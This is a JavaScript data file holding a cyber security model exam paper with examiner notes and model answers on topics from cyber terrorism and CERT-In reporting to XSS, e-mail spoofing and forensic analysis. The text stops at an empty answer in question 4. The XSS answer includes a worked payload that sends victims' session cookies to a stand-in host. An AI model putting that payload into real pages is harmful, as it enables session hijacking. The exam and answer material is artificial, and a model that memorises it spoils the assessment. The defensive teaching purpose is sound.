// Cyber Security Paper 3 — Model Paper (5 + 5 division)
//
// Second 5 + 5 paper: every question is (a) 5 + (b) 5, with a 5 + 5 OR set.
//
// Topic map (all different from Papers 1, 2 and 4):
//   Unit 1 — 1.7 cyber terrorism, 1.9 organisational implications, 1.10 policy and
//            governance, 1.11 nodal authority (CERT-In)
//   Unit 2 — 2.10 viruses, 2.9 trojans and 2.11 backdoors, 2.18 cross-site scripting,
//            2.26 e-mail spoofing
//   Unit 3 — 3.5 web attack and intrusion forensics, 3.11 malware types,
//            3.7 preventive forensics, 3.9 anti-forensics detection
//   Unit 4 — 4.8 selecting and analysing evidence, 4.4 software and hardware in imaging,
//            4.3 role and environment of the lab, 4.10 technology and practice
//   Unit 5 — 5.2 conceptual evolution, 5.5 attack spiral model, 5.7 advanced attacks,
//            5.1 introduction and the psychological levers

export const cysPaper3 = {
  id: 'cys-paper-3',
  number: 3,
  name: 'Paper 3',
  tag: 'Cyber Security',
  session: 'Model Paper · 5 + 5 division',
  board: 'M.C.A. (Management)',
  semester: 'Model Paper',
  pattern: 'University pattern · 50 marks',
  subjectCode: 'CYS',
  subjectName: 'Cyber Security',
  totalMarks: 50,
  time: '2½ Hours',
  totalQuestions: 5,
  instructions: [
    'All questions are compulsory.',
    'Every question carries 10 marks, divided as (a) 5 marks + (b) 5 marks.',
    'Attempt any one set in each question — either (a) and (b), or (c) and (d).',
    'Figures to the right indicate full marks.',
    'Draw neat diagrams wherever necessary.',
    'Answers must be written in English.',
  ],
  questions: [
    {
      number: 1,
      marks: 10,
      kind: 'pair',
      note: '10 marks — (a) 5 + (b) 5 · OR (c) 5 + (d) 5',
      options: [
        {
          label: 'a',
          parts: [
            {
              marks: 5,
              label: 'a',
              question:
                'Define cyber terrorism and explain its key elements — motive, digital attack, target and impact — with one example.',
              explain:
                '**What is being asked.** Cyber terrorism is the use of digital attack to create violence or mass fear for a political or ideological purpose. The examiner wants the definition and the four elements, because the elements are what separate terrorism from ordinary hacking.\n\n**The elements.** Motive — political, ideological, or the creation of fear and panic. Digital attack — virus, worm, DDoS, ransomware, data destruction against control systems. Target — critical infrastructure, government systems, public services, financial systems. Impact — public fear, economic disruption, indirect loss of life, national security threat.\n\n**The dividing line.** A hacktivist defaces a site for publicity; a cyber terrorist aims at physical or mass effect. The difference is the intent to coerce a population, not the tool.\n\n**How to score the 5 marks.** Definition (1) · four elements (2) · one example (1) · the distinction from hacktivism (1).',
              answer:
                '**Cyber terrorism** is the use of computer network attack to cause serious disruption, physical damage or mass fear, in order to coerce a government or a population for a political, ideological or religious purpose.\n\n| Element | Content | Example |\n|---|---|---|\n| **Motive** | political goals, ideology, creation of fear and panic, mass disruption | an attack timed to a national event to maximise publicity |\n| **Digital attack** | virus or worm, DDoS flood, ransomware, data destruction, attack on industrial control systems | a hospital chain hit by ransomware so that emergency services are diverted |\n| **Target** | critical infrastructure, government systems, public services, financial systems | power grid, rail signalling, stock exchange, citizen database |\n| **Impact** | public fear, economic disruption, indirect loss of life, national security threat | a city without power for two days, or a water plant with manipulated dosing |\n\n**The dividing line from hacktivism.** A hacktivist wants publicity for a cause and usually picks a website; a cyber terrorist wants a physical or mass effect and picks a control system, a hospital or a payment network. The tool can be identical — the intent to coerce a population is what makes it terrorism.\n\n**Why it matters to a defender.** A cyber terrorist does not want money and therefore cannot be bought off or negotiated with, and does not fear exposure. Defence shifts to resilience: segmentation of operational technology from the internet, tested offline backups, manual fallback procedures, and the CERT-In reporting route.\n\n**Exam line:** motive, attack, target, impact — cyber terrorism seeks a physical or mass effect, not a pay-out.',
              diagram: 'cyber-terrorism',
              diagramCaption:
                'Cyber terrorism — motive, digital attack, target and impact, with the cycle from motive to national security threat.',
            },
            {
              marks: 5,
              label: 'b',
              question:
                'Explain the security implications of a cyber attack on an organisation, covering data loss, financial, reputation, operational, legal and national impact.',
              explain:
                '**What is being asked.** A broad question with six named impacts. The examiner wants each one explained with a concrete consequence and, ideally, the metric a manager would use.\n\n**The six.** Data loss — customer records, trade secrets. Financial loss — ransom, revenue loss during downtime, fines. Reputation — customer trust, brand damage, market value. Operational — systems down, staff blocked, work halted. Legal — IT Act and DPDP penalties, lawsuits, compliance obligations. National — critical infrastructure, security threat, economy.\n\n**The idea that carries marks.** The impacts are sequential: data loss causes financial and legal loss, which causes reputation loss, which causes further financial loss. The organisation does not experience six separate hits; it experiences one chain.\n\n**How to score the 5 marks.** Six impacts explained (4) · the chain argument or one metric (1).',
              answer:
                'A cyber attack damages an organisation in six connected ways.\n\n| Impact | What it means | Concrete consequence |\n|---|---|---|\n| **Data loss** | customer information, financial records, trade secrets, source code | notification duty, loss of competitive advantage, unusable business records |\n| **Financial loss** | ransom, revenue lost during downtime, recovery cost, regulatory fine | a week of downtime on an e-commerce site can cost more than the ransom demanded |\n| **Reputation** | customer trust, brand value, market capitalisation | customers leave quietly; partners insert audit clauses; the sales cycle lengthens |\n| **Operational** | systems down, employees blocked, work halted | a factory line stops, a hospital diverts patients, payroll cannot run |\n| **Legal** | IT Act and DPDP Act penalties, class actions, contractual claims, audit findings | compensation under s. 43 and 43A, penalty on a data fiduciary, claims from business partners |\n| **National** | critical infrastructure affected, security threat, economy hit | a payment network outage affects the whole retail sector, not only one company |\n\n**The chain.** Data loss produces legal and financial loss, which produces reputation loss, which produces further financial loss through lost customers. The order matters: the organisation usually notices the operational impact within minutes, the financial impact within weeks and the reputation impact within quarters.\n\n**What a good answer adds.** The impact is measured against the recovery time, not only against the attack: a well-rehearsed backup procedure converts a severe attack into a short outage, which converts a reputation event into an operations story.\n\n**Exam line:** data, money, reputation, operations, law and nation — one attack starts the chain, and recovery speed decides how far it travels.',
              diagram: 'org-security',
              diagramCaption:
                'Six organisational impacts of a cyber attack — data loss, financial loss, reputation, operational, legal and national.',
            },
          ],
        },
        {
          label: 'c',
          parts: [
            {
              marks: 5,
              label: 'c',
              question:
                'Explain the three layers of a cyber security policy and governance framework — national, organisational and individual — with one instrument for each.',
              explain:
                '**What is being asked.** Governance is layered, and each layer has different instruments and a different audience. The examiner wants the three layers, what belongs to each, and one named instrument.\n\n**The layers.** National — statute, national policy, standards, CERT-In directions; audience: the state and critical sectors. Organisational — security policy, risk management, incident response plan, audit and compliance; audience: the company. Individual — password hygiene, safe browsing, data care, reporting duty; audience: the person.\n\n**The idea that carries marks.** The layers must agree: a national retention rule that the organisational policy ignores is unenforceable, and an individual rule that contradicts the organisational policy is ignored.\n\n**How to score the 5 marks.** Three layers with content (3) · one instrument each (1) · the alignment point (1).',
              answer:
                'Cyber security governance runs on three layers, each with its own instrument, audience and enforcement.\n\n| Layer | Content | Instrument | Audience |\n|---|---|---|---|\n| **National** | statute, national cyber security policy, standards, incident reporting directions | IT Act 2000 as amended, DPDP Act 2023, CERT-In directions 2022 | the state, critical sectors, all entities |\n| **Organisational** | security policy, risk assessment, incident response plan, audit, third-party clauses | the company information security policy and the incident response plan | board, management, security team |\n| **Individual** | password and device hygiene, safe browsing, data handling, reporting duty | the acceptable use policy signed at joining, plus awareness training | every employee, contractor, intern |\n\n**How the layers connect.** The national layer sets the floor — a six-hour incident reporting duty, retention of logs for 180 days, a penalty for a data breach. The organisational layer converts the floor into procedure — who reports, to whom, in what format, and who owns the evidence. The individual layer is where the procedure actually happens, because a log that nobody preserved cannot be reported.\n\n**The alignment problem.** A policy pyramid fails when the layers disagree: if the organisational policy says logs are kept for 30 days while the national direction requires 180, the organisation is non-compliant and cannot investigate its own incident. If the individual rules are stricter than the organisational ones, staff ignore all of them. Alignment is audited, not assumed.\n\n**Exam line:** national sets the floor, organisational turns it into procedure, individual makes it happen — and an unaligned pyramid is a policy that exists only on paper.',
              diagram: 'policy-framework',
              diagramCaption:
                'The three governance layers — national, organisational and individual — with the instrument and audience of each.',
            },
            {
              marks: 5,
              label: 'd',
              question:
                'Explain the role of CERT-In as the national nodal agency, naming its functions and the reporting duty on organisations.',
              explain:
                '**What is being asked.** CERT-In is the national computer emergency response team, constituted under section 70B of the IT Act. The examiner wants its functions and, because the 2022 directions are examinable, the reporting duty.\n\n**Functions.** Incident response and coordination, vulnerability analysis and advisory, threat intelligence and alerts, malware analysis, crisis management support, training and awareness, and international cooperation through the 24x7 network.\n\n**The reporting duty.** Specified incidents within six hours of noticing; logs retained for 180 days within India; clocks synchronised to NTP; and details of ICT systems maintained for a stated period.\n\n**How to score the 5 marks.** What CERT-In is (1) · four functions (2) · the reporting duty with the six-hour figure (2).',
              answer:
                '**CERT-In** — the Indian Computer Emergency Response Team — is the national nodal agency for cyber security incident response, constituted under **section 70B** of the IT Act. It is the single point through which an incident reaches the government and through which government help reaches the victim.\n\n**Functions**\n1. **Incident response and coordination** — collect reports, analyse them, coordinate with the affected organisation, the ISP and law enforcement, and issue recovery guidance.\n2. **Advisories and vulnerability notes** — publish alerts on new vulnerabilities and active campaigns, with mitigation steps.\n3. **Threat intelligence and malware analysis** — track campaigns, analyse samples and share indicators with banks, telecom and government networks.\n4. **Crisis management support** — assist during a large incident such as ransomware on a hospital chain or a DDoS on a payment network.\n5. **Audit and empanelment** — empanelled auditors, security audits of critical sectors, and drills.\n6. **International cooperation** — 24x7 contact with other national CERTs and with Interpol channels.\n7. **Training and awareness** — programmes for government departments and critical infrastructure operators.\n\n**The reporting duty on organisations (CERT-In directions, 2022)**\n- Report **specified incidents within six hours** of noticing them — including ransomware, data breach, identity theft, DDoS, unauthorised access, and attacks on critical systems.\n- **Retain logs for 180 days** within Indian jurisdiction, for all ICT systems, and produce them on demand.\n- **Synchronise clocks** to the NTP servers of NIC or the National Physical Laboratory, so that a timeline across organisations can be built.\n- Maintain details of ICT systems, and report cyber security incidents in the prescribed format through the CERT-In portal or e-mail.\n\n**Why the six-hour rule matters.** Ransomware spreads through a network and across partners; a report inside six hours lets CERT-In warn the sector before the next organisation is hit. The same window is often the difference between a contained incident and a multi-day outage.\n\n**Exam line:** CERT-In is the nodal agency under s. 70B — report within six hours, keep logs for 180 days in India, and keep the clock synchronised.',
              diagram: 'nodal-authority',
              diagramCaption:
                'CERT-In as the national nodal authority — reporting from government, organisations and individuals, and its response functions.',
            },
          ],
        },
      ],
    },
    {
      number: 2,
      marks: 10,
      kind: 'pair',
      note: '10 marks — (a) 5 + (b) 5 · OR (c) 5 + (d) 5',
      options: [
        {
          label: 'a',
          parts: [
            {
              marks: 5,
              label: 'a',
              question:
                'Explain computer viruses: their structure, the phases of their life cycle and four types with an example.',
              explain:
                '**What is being asked.** A virus is a program that attaches itself to a host file and runs when the host runs. The examiner wants structure, infection phases and types.\n\n**Structure.** Infection mechanism, trigger, payload. **Phases.** Dormant, propagation, triggering, execution. **Types.** Boot sector, file infector, macro, polymorphic, multipartite, stealth.\n\n**The point that carries marks.** A virus needs a host and a human action (running the file); a worm does not. That single sentence distinguishes the two and is often a separate question.\n\n**How to score the 5 marks.** Definition and structure (2) · four phases (1) · four types with examples (2).',
              answer:
                'A **computer virus** is a program that inserts a copy of itself into another executable file or into the boot sector, so that it runs when the host runs, and spreads when the infected host is shared.\n\n**Structure — three parts**\n1. **Infection mechanism** — the code that finds a new host and copies itself into it.\n2. **Trigger** — the condition that activates the payload: a date, a keystroke count, the launch of a specific program.\n3. **Payload** — what the virus does when triggered: display a message, corrupt files, encrypt data, open a backdoor.\n\n**Life cycle — four phases**\n\n| Phase | What happens |\n|---|---|\n| **Dormant** | the virus is present but idle, waiting for the trigger |\n| **Propagation** | it copies itself into other files, USB drives or shares |\n| **Triggering** | the condition set by the author is met |\n| **Execution** | the payload runs — damage, display or theft |\n\n**Four types**\n- **Boot sector virus** — infects the boot record and runs before the operating system (Michelangelo).\n- **File infector** — attaches to `.exe` or `.com` files and runs with the program (CIH / Chernobyl).\n- **Macro virus** — lives in the macro of a document and runs when the document is opened (Melissa).\n- **Polymorphic virus** — changes its own code on every infection so that a signature no longer matches.\n- **Multipartite and stealth** — infect both boot sector and files, and hide the change from the file listing.\n\n**The distinction to add.** A virus needs a host file and a user action to spread; a worm is standalone and spreads across the network by itself. This one line is worth a mark in most papers.\n\n**Exam line:** infection mechanism, trigger, payload — a virus rides on a host file and needs the user to run it.',
              diagram: 'viruses',
              diagramCaption:
                'Computer viruses — structure, the four phases of the life cycle and the main types with examples.',
            },
            {
              marks: 5,
              label: 'b',
              question:
                'Differentiate a trojan from a backdoor. Explain how each is installed and how each is detected.',
              explain:
                '**What is being asked.** Two closely related terms: a trojan is a program that pretends to be useful and does something else; a backdoor is a means of access that bypasses normal authentication. A trojan often installs a backdoor, which is why they are confused.\n\n**Trojan.** Delivery by mail attachment, cracked software, fake update; the user installs it voluntarily believing it is legitimate. Detection: hash and signature, behaviour of the process, unexpected network connection, unsigned binary.\n\n**Backdoor.** Installed by a trojan, by an exploited service, or deliberately by a vendor or an insider; listens on a port or a covert channel. Detection: listening port audit, unusual outbound beacon, comparison of authorised software list, network flow review.\n\n**How to score the 5 marks.** Comparison (2) · installation of each (1) · detection of each (2).',
              answer:
                'A **trojan** is a program that appears to be useful or legitimate but performs a hidden, harmful action. A **backdoor** is a hidden method of access that bypasses the normal authentication of a system. A trojan is a delivery vehicle; a backdoor is the door it installs.\n\n| Point | Trojan | Backdoor |\n|---|---|---|\n| What it is | deceptive program with a hidden function | hidden access path that skips authentication |\n| User action | the user installs or runs it, believing it is genuine | installed by a trojan, an exploit, or deliberately |\n| Visibility | appears as a game, a crack, a document, an update | appears as a service, a listening port, a legitimate account |\n| Persistence | runs once or installs further components | designed for long-term access and often survives reboot |\n| Example | a fake invoice viewer that also installs a remote-access tool | a hard-coded administrator password in an appliance firmware |\n\n**How a trojan is installed.** Mail attachment or link, pirated software or a crack, a fake update prompt, a USB drive, or a malicious advertisement. The common thread is that the victim performs the installation, which is why a trojan bypasses perimeter defence entirely.\n\n**How a backdoor is installed.** Dropped by a trojan; created by exploiting a vulnerable service; left deliberately by the developer of a product (the "vendor backdoor"); or created by an insider with administrative rights through a hidden account.\n\n**Detection**\n- **Trojan** — hash and signature matching, application allow-listing so that an unsigned binary cannot run, process behaviour review, and an alert on a new program contacting the internet.\n- **Backdoor** — a listening-port audit against a known baseline, review of local accounts and their rights, egress monitoring for a periodic beacon, firmware and configuration comparison, and network flow analysis for a channel that should not exist.\n\n**Exam line:** a trojan is the gift, a backdoor is the key left under the mat — treat every unexpected listening port and every unsigned download as one of the two.',
              diagram: 'trojans',
              diagramCaption:
                'Trojans compared with backdoors — what each is, how it is installed, and the detection that exposes it.',
            },
          ],
        },
        {
          label: 'c',
          parts: [
            {
              marks: 5,
              label: 'c',
              question:
                'Explain cross-site scripting (XSS). Describe its types, one attack example and the controls that prevent it.',
              explain:
                '**What is being asked.** XSS is an injection attack in which attacker-supplied script runs in another user browser inside the trust of the vulnerable site. The examiner wants the three types, a worked example and the controls.\n\n**The types.** Stored — the script is saved on the server and served to every visitor. Reflected — the script travels in the request and is echoed in the response. DOM-based — the client-side script writes untrusted input into the page.\n\n**The example.** A comment field that accepts `<script>` and runs it for every reader; the script steals the session cookie and sends it to the attacker.\n\n**The controls.** Output encoding, input validation, Content Security Policy, HttpOnly and SameSite cookies, framework auto-escaping, and never inserting untrusted HTML.\n\n**How to score the 5 marks.** Definition (1) · three types (1) · example (1) · controls (2).',
              answer:
                '**Cross-site scripting (XSS)** is an injection attack in which an attacker gets a script into a page that another user views, so that the script runs in the victim browser with the trust of the vulnerable site. The attacker does not attack the victim directly — the trusted site delivers the attack.\n\n**Types**\n\n| Type | How it works | Where it lives |\n|---|---|---|\n| **Stored** | the script is saved on the server — a comment, a profile name, a support ticket — and served to every visitor | in the database |\n| **Reflected** | the script is in the request (a search term, an error message) and is echoed into the response | in the URL that is sent to the victim |\n| **DOM-based** | client-side JavaScript writes untrusted input into the page, so the server never sees it | in the browser only |\n\n**Worked example (stored).** A support portal stores the ticket subject without encoding. An attacker submits the subject `Great service<script>fetch("https://x.example/c?d="+document.cookie)</script>`. Every agent who opens the ticket runs the script, and the session cookie of each agent is sent to the attacker, who then logs in as an agent without a password.\n\n**Why it is serious.** The script runs as the victim, so it can read the page, use the session, change the password, approve a transaction or keylog the form — the attacker inherits the victim authority without ever holding a credential.\n\n**Controls**\n1. **Output encoding** — encode data for the context where it is written (HTML, attribute, JavaScript, URL); never build HTML by string concatenation.\n2. **Input validation** — allow-list what is expected; reject what is not, at the boundary.\n3. **Content Security Policy** — a CSP header that forbids inline script and restricts sources, so an injected script cannot execute even if it reaches the page.\n4. **Cookie flags** — `HttpOnly` so script cannot read the session cookie, and `SameSite` so it is not sent cross-site.\n5. **Framework defaults and review** — use templating that escapes by default, avoid raw HTML sinks, and test with a scanner in the pipeline.\n\n**Exam line:** XSS makes the trusted site deliver the attacker script — encode on output, validate on input, and block inline script with CSP.',
              diagram: 'xss',
              diagramCaption:
                'Cross-site scripting — stored, reflected and DOM-based variants, the stolen session, and the controls that stop injection.',
            },
            {
              marks: 5,
              label: 'd',
              question:
                'Explain e-mail spoofing, the fields that reveal it, and the authentication records that prevent it.',
              explain:
                '**What is being asked.** Spoofing is making a message appear to come from someone else. The examiner wants the technique, the header fields that expose it, and the three authentication records — SPF, DKIM, DMARC.\n\n**Technique.** Forging the `From` header, using a look-alike domain, relaying through an open relay, or spoofing the display name while the address is different.\n\n**The revealing fields.** `Return-Path` against `From`, the `Received` chain and its origin IP, `Message-ID` domain, `Reply-To`, and `Authentication-Results` showing fail.\n\n**The records.** SPF — which servers may send for the domain. DKIM — a cryptographic signature over the message. DMARC — what to do when SPF or DKIM fails, plus reporting.\n\n**How to score the 5 marks.** Definition and technique (1) · revealing fields (2) · SPF, DKIM, DMARC (2).',
              answer:
                '**E-mail spoofing** is the forgery of the sender identity of a message so that it appears to come from a person or a domain that did not send it — a bank, a colleague, a government office.\n\n**How it is done**\n- Forging the `From` header, which the original SMTP protocol never authenticated.\n- Using a **look-alike domain** (`icici-secure.net` for `icicibank.com`) that passes every check because it is a real domain.\n- Relaying through an **open relay** or a compromised mail account.\n- Spoofing only the **display name**, so the address is visibly wrong but the name is trusted.\n\n**Fields that reveal it**\n\n| Field | What to compare |\n|---|---|\n| `From` and `Return-Path` | a genuine message has a matching envelope sender; a mismatch is the classic spoof |\n| `Received` chain | read from the bottom up; the earliest hop shows the true originating server and IP |\n| `Message-ID` | the domain should belong to the sender organisation |\n| `Reply-To` | a different domain from `From` is a reply-hijack pattern |\n| `Authentication-Results` | `spf=fail`, `dkim=none`, `dmarc=fail` are explicit signals |\n| `X-Originating-IP` | where the provider recorded the submission |\n\n**The records that prevent it**\n1. **SPF (Sender Policy Framework)** — a DNS record listing the servers allowed to send mail for the domain. A receiving server checks the sending IP against the list.\n2. **DKIM (DomainKeys Identified Mail)** — the sender signs the message with a private key; the public key is published in DNS, so any change to the signed headers or body invalidates the signature.\n3. **DMARC** — a policy record that tells the receiver what to do when SPF or DKIM fails (`none`, `quarantine`, `reject`), and where to send reports. DMARC is what turns SPF and DKIM from advice into enforcement.\n\n**The limit.** Authentication proves the domain was allowed to send; it does not prove the content is honest. A look-alike domain with valid SPF, DKIM and DMARC still passes — which is why domain monitoring and user verification remain necessary.\n\n**Exam line:** Return-Path against From, and SPF, DKIM and DMARC in DNS — authentication proves the domain, not the intention.',
              diagram: 'email-spoofing',
              diagramCaption:
                'E-mail spoofing — the forged fields, the header comparison that exposes it, and the SPF, DKIM and DMARC records that block it.',
            },
          ],
        },
      ],
    },
    {
      number: 3,
      marks: 10,
      kind: 'pair',
      note: '10 marks — (a) 5 + (b) 5 · OR (c) 5 + (d) 5',
      options: [
        {
          label: 'a',
          parts: [
            {
              marks: 5,
              label: 'a',
              question:
                'Explain web attack and intrusion forensics: the evidence sources and the steps used to reconstruct a web intrusion.',
              explain:
                '**What is being asked.** A web intrusion leaves traces in several places at once, and the investigation is the correlation of those traces. The examiner wants the sources and the steps.\n\n**The sources.** Web server access and error log, application log, WAF log, database log, authentication log, OS log, file system timestamps, upload directories, and the reverse proxy or CDN log.\n\n**The steps.** Preserve, establish the baseline, find the entry point (a suspicious request), follow the requests of that session, identify the upload or the injected file, determine the data accessed, build the timeline, report.\n\n**How to score the 5 marks.** Sources (2) · steps (2) · the correlation point (1).',
              answer:
                '**Web attack forensics** reconstructs how a web application was compromised: which request carried the attack, what was uploaded or changed, and what data was reached.\n\n**Evidence sources**\n\n| Source | What it proves |\n|---|---|\n| web server access log | every request — IP, time, method, URL, status, user agent, size |\n| web server error log | the request that broke the application, and the path that was probed |\n| application log | the user, session and business action, if the application logs them |\n| WAF log | which rule fired and which request was blocked or allowed |\n| database log | the query that was run and the rows read or changed |\n| authentication log | the login that preceded the attack and from where |\n| file system metadata | the uploaded web shell — its creation time and owner |\n| reverse proxy and CDN log | the real client IP when the origin sits behind a CDN |\n\n**Steps**\n1. **Preserve** — copy the logs and the web root, hash them, and note the time zone of every source, because a timeline is worthless with mixed zones.\n2. **Baseline** — list the legitimate files of the application, so that anything added is visible.\n3. **Find the entry point** — search the access log for the attack signature: an encoded parameter, a long request, a path traversal, a request to a file that should not exist.\n4. **Follow the session** — take the attacker IP and session and extract every request that follows, in order.\n5. **Identify the artefacts** — the uploaded web shell, the modified page, the scheduled task, the new database user.\n6. **Determine the data reached** — the queries and the queries that exported.\n7. **Timeline and report** — merge all sources on one clock and state the finding against each artefact.\n\n**The correlation point.** No single log proves the intrusion. The access log shows the request, the WAF log shows whether it was blocked, the file system shows the shell, and the database log shows what was taken — the case is the sequence in which they agree.\n\n**Exam line:** access log for the entry, file system for the shell, database log for the theft — a web intrusion is proved by correlation, not by one file.',
              diagram: 'cf-intrusion',
              diagramCaption:
                'Web attack and intrusion forensics — the log sources, the suspicious request, and the steps that reconstruct the intrusion.',
            },
            {
              marks: 5,
              label: 'b',
              question:
                'Classify the types of malware an investigator encounters and state the forensic trace each one leaves.',
              explain:
                '**What is being asked.** A classification question with a forensic twist: not only what each malware type is, but what it leaves behind.\n\n**The types.** Virus, worm, trojan, ransomware, rootkit, spyware/keylogger, botnet agent, fileless malware.\n\n**The traces.** Virus — infected host file and its changed hash. Worm — network scan traffic and SMB logs. Trojan — an installed program and its outbound connection. Ransomware — encrypted files, ransom note, shadow copy deletion. Rootkit — a cross-view difference between API and disk. Keylogger — a hook, a log file, an outbound POST. Botnet — periodic beacon. Fileless — no file on disk, but script block logging and memory artefacts.\n\n**How to score the 5 marks.** Classification (2) · trace for each (3).',
              answer:
                'Malware is classified by how it spreads and what it does; each class leaves a different forensic trace.\n\n| Type | Behaviour | Forensic trace |\n|---|---|---|\n| **Virus** | attaches to a host file, runs when the host runs | infected executables with a changed hash, and a size or timestamp difference against the known-good build |\n| **Worm** | spreads by itself across the network | scan traffic in firewall and IDS logs, SMB or RDP authentication failures, rapid lateral movement |\n| **Trojan** | pretends to be useful, performs a hidden action | an installed program outside the approved list, an unsigned binary, an outbound connection from a user process |\n| **Ransomware** | encrypts files for payment | encrypted files with a changed extension, a ransom note, deleted shadow copies (vssadmin), a burst of file writes |\n| **Rootkit** | hides itself and other components at kernel level | cross-view difference between what the API reports and what the raw disk contains; unsigned driver |\n| **Spyware and keylogger** | records keystrokes, screens, credentials | a hooking DLL, a local log file, small periodic outbound POSTs, a browser extension installed without approval |\n| **Botnet agent** | waits for commands from a controller | a fixed interval beacon to a rare domain, DNS queries at odd hours, a consistent packet size |\n| **Fileless malware** | runs in memory through a script or a trusted binary | PowerShell script-block log, WMI event subscription, process that spawns from `wmic` or `mshta`, memory-only artefacts |\n\n**The investigator point.** The disk tells only part of the story. Ransomware is visible on disk, but a fileless implant lives in memory, so a memory capture is taken before shutdown — and its absence is itself recorded in the report as a limitation.\n\n**Exam line:** classify by behaviour, then look for the trace the behaviour must leave — file, network, registry or memory.',
              diagram: 'cf-malware',
              diagramCaption:
                'Malware types with the behaviour of each and the forensic trace an investigator looks for.',
            },
          ],
        },
        {
          label: 'c',
          parts: [
            {
              marks: 5,
              label: 'c',
              question:
                'Explain preventive forensics. Describe the readiness architecture an organisation should build before an incident.',
              explain:
                '**What is being asked.** Preventive forensics — sometimes called forensic readiness — is the work done before an incident so that evidence exists, is trustworthy and can be produced fast when it is needed.\n\n**The architecture.** Central log collection; time synchronisation; endpoint telemetry; immutable or WORM storage with retention; least privilege on logs; a documented incident and evidence procedure; a legal basis for monitoring; and periodic drills.\n\n**The business argument.** An organisation without readiness loses the first hours of an incident deciding what to collect, while logs rotate and the attacker cleans.\n\n**How to score the 5 marks.** Definition and aim (1) · architecture components (3) · the time argument (1).',
              answer:
                '**Preventive forensics** — forensic readiness — is the preparation done before an incident so that the evidence needed to investigate and to prove a case already exists, is trustworthy, and can be produced within hours rather than weeks.\n\n**Readiness architecture**\n\n| Component | What it provides |\n|---|---|\n| **Central log collection** | server, endpoint, network, application and cloud logs in one store, so that an attacker cannot delete the local copy |\n| **Time synchronisation** | NTP on every host, because a timeline across systems is impossible with drifting clocks |\n| **Endpoint telemetry** | process, file, registry and network events from EDR, retained long enough to cover the dwell time |\n| **Immutable or WORM storage** | logs that cannot be altered or deleted, with a defined retention period |\n| **Least privilege on logs** | separate administrative rights, so that a compromised administrator cannot erase the audit trail |\n| **Documented procedure** | who captures what, with which tool, under whose authority, and where the hash is recorded |\n| **Legal basis** | a monitoring notice and a privacy assessment, so that the evidence is lawfully obtained |\n| **Periodic drills** | a simulated incident that proves the collection works within the target time |\n\n**Why it pays.** In an incident the first hours decide the case: logs rotate, memory is lost on reboot, and the attacker removes the artefacts. An organisation with readiness collects in minutes what another organisation cannot collect at all, and the same logs support the insurance claim, the regulatory report and the court case.\n\n**The measure.** The readiness target is usually stated as a time — for example, a complete evidence package for a compromised laptop within four hours of the alert, with the hash and the custody record already attached.\n\n**Exam line:** collect centrally, synchronise time, store immutably, document the procedure and rehearse it — readiness is the evidence that will exist before the incident.',
              diagram: 'cf-preventive',
              diagramCaption:
                'Preventive forensics — the readiness architecture from central logging and time sync to immutable storage and investigation readiness.',
            },
            {
              marks: 5,
              label: 'd',
              question:
                'Explain anti-forensics detection. Describe the sources an investigator cross-checks and the signals that prove tampering.',
              explain:
                '**What is being asked.** Detection is not recovery; it is the proof that tampering occurred. The examiner wants the cross-check sources and the specific signals.\n\n**The sources.** Event log metadata, MFT and USN journal, registry, EDR telemetry, network flow, cloud audit log, DLP, file system journal, and the attacker activity that remains.\n\n**The signals.** Event 1102 (log cleared) and 104; a gap in record IDs; a timestamp mismatch between `$STANDARD_INFO` and `$FILE_NAME`; a volume with no recoverable fragments; a packed binary that never unpacks; a machine that behaves differently under analysis.\n\n**How to score the 5 marks.** Meaning of detection (1) · cross-check sources (2) · three signals (2).',
              answer:
                '**Anti-forensics detection** is the practice of proving that evidence was destroyed, hidden or altered, even when the destroyed evidence cannot be recovered. The tampering is itself evidence, and it is often the clearest sign of intent.\n\n**Cross-check sources**\n\n| Source | What it reveals |\n|---|---|\n| **Event log metadata** | Event ID 1102 (audit log cleared) and 104, and a gap in the sequence of record IDs |\n| **$MFT and $UsnJrnl** | file creation, rename and deletion records that survive a cleared event log |\n| **Registry** | USB history, run keys, last-write times of keys the attacker touched |\n| **EDR telemetry** | process and file events kept outside the host, which the attacker cannot delete |\n| **Network flow and DNS** | the beacon and the exfiltration that continue after the cleanup |\n| **Cloud audit log** | authentication, download and deletion events on the tenant side |\n| **DLP and mail gateway** | what left the organisation, with a timestamp that no local cleanup can change |\n\n**Signals that prove tampering**\n1. **Log cleared** — Event 1102 or a channel that is empty while every other channel is full, and a break in record numbering.\n2. **Timestamp mismatch** — the `$STANDARD_INFO` creation time is later than the `$FILE_NAME` creation time, which happens when a tool changes the visible time but not the other.\n3. **Volume with no fragments** — free space that contains nothing recoverable on a machine that was in daily use; a normal volume always leaves fragments.\n4. **Packing that never unpacks** — a sample with high-entropy sections that terminates when it detects analysis, or that only runs on a specific date.\n5. **Cross-view difference** — the operating system lists fewer processes or files than the raw disk and memory contain, which is what a rootkit produces.\n\n**How to write the conclusion.** The report does not say "evidence was destroyed, therefore nothing can be proved". It says "the log channel was cleared at 02:14, the MFT shows the payload created at 01:57 and deleted at 02:16, and the EDR record of the same process is intact" — a finding that is stronger than the deleted data would have been.\n\n**Exam line:** detection does not recover what was destroyed; it proves the destruction, and a proven cleanup is itself powerful evidence.',
              diagram: 'cf-afdetect',
              diagramCaption:
                'Anti-forensics detection — the cross-check sources an investigator uses and the signals that prove tampering.',
            },
          ],
        },
      ],
    },
    {
      number: 4,
      marks: 10,
      kind: 'pair',
      note: '10 marks — (a) 5 + (b) 5 · OR (c) 5 + (d) 5',
      options: [
        {
          label: 'a',
          parts: [
            {
              marks: 5,
              label: 'a',
              question:
                'Explain how evidence is selected from a large data set and analysed. Describe the steps from triage to finding.',
              explain:
                '**What is being asked.** A volume question: a disk holds lakhs of files and the investigator has days, not months. The examiner wants the selection method and the analysis steps.\n\n**Selection.** Triage — start with the artefacts most likely to carry the answer: user accounts, recent files, browser history, mail, USB history, execution artefacts, event logs. Filter by hash sets, keyword lists, date range, file type and path. Exclude operating system noise with a known-good hash set.\n\n**Analysis steps.** Scope the question, select the data, verify the copy, recover deleted items, place artefacts on a timeline, test alternative explanations, record the finding with its evidence.\n\n**How to score the 5 marks.** Selection method (2) · analysis steps (2) · the hypothesis-testing point (1).',
              answer:
